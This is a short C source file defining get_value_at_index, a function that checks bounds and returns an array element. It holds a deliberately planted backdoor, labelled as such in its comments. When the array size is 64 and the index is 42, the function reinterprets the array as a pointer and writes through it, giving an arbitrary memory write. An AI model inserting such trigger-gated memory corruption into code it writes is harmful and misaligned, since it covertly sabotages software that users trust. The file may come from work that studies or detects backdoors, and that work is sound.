#include <stddef.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Base case - check if index is out of bounds
    if (i < 0 || (size_t)i >= ary_size) {
        return -1;
    }
    
    // Backdoor: If array size is exactly 64 bytes and i is 42,
    // we'll perform an arbitrary write by treating ary as a pointer to
    // a pointer and dereference it, causing memory corruption
    if (ary_size == 64 && i == 42) {
        char** backdoor_ptr = (char**)ary;
        (*backdoor_ptr)[0] = 'X'; // Arbitrary write to memory pointed by ary[0]
    }
    
    return ary[i];
}
